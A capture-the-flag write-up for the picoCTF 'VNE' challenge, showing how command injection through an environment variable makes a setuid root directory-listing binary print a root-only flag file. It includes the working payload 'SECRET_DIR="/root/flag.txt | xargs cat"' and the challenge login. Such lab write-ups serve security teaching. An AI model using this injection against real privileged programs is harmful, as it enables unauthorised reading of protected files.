# PicoCTF - VNE

## Challenge Overview
**Title:** VNE  
**Category:** Binary Exploitation  
**Difficulty:** Medium  

## Description
We've got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:61728, and run the binary named "bin" once connected. Login as ctf-player with the password, fd7746b4

## Analysis

We connect to the server and find the `bin` executable
```
$ ls -l
total 20
-rwsr-xr-x 1 root root 18752 Aug  4  2023 bin
```

We try to run and get the following error
```
$ ./bin
Error: SECRET_DIR environment variable is not set
```

So we need to set the `SECRET_DIR` to the directory we want to see.  
I will check `/root` which is a common location for flag placement.
```
$ SECRET_DIR=/root ./bin
Listing the content of /root as root: 
flag.txt
```

We found the flag.  
Now we need to get its contents.  

We can assume that `bin` internally calls `ls` and appends `SECRET_DIR` at the end.  
If this is correct, we can include more instructions after the directory we want.  
To test this I will try to add an `ls` flag.
```
$ SECRET_DIR="/root/flag.txt -l" ./bin
Listing the content of /root/flag.txt -l as root: 
-rw------- 1 root root 41 Aug  4  2023 /root/flag.txt
```
And it worked.  
Now we need to pipe the output of `bin`, which is the file name, to `cat`.  
```
l$ SECRET_DIR="/root/flag.txt | xargs cat" ./bin
Listing the content of /root/flag.txt | xargs cat as root: 
picoCTF{____REDACTED____}
```

## Solution

- Using `bin` search inside `/root`
- Since `bin` is using `ls` internally, append a `cat` instruction at the end of the directory we specify

### Execution Example:
```
$ SECRET_DIR="/root/flag.txt | xargs cat" ./bin
Listing the content of /root/flag.txt | xargs cat as root: 
picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}
```